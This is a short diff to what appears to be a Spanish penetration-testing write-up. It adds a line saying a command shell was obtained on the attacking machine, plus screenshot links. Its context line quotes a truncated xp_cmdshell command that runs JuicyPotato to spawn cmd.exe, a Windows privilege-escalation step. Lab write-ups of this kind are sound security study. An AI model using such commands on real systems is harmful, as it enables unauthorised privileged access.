@@ -549,3 +549,7 @@ xp_cmdshell C:\Tools\JuicyPotato.exe -l 53375 -p "C:\Windows\System32\cmd.exe" -
 
 <img width="1874" height="570" alt="image" src="https://github.com/user-attachments/assets/41c18221-603e-4a3d-be1b-35a80424faaf" />
 
+En nuestra máquina atacante obtenemos el cmd:
+<img width="1209" height="271" alt="image" src="https://github.com/user-attachments/assets/b70450ea-f788-4280-a31f-4867e799df2f" />
+
+<img width="632" height="228" alt="image" src="https://github.com/user-attachments/assets/8d2003e3-76d6-44ab-92cb-2248cede598f" />
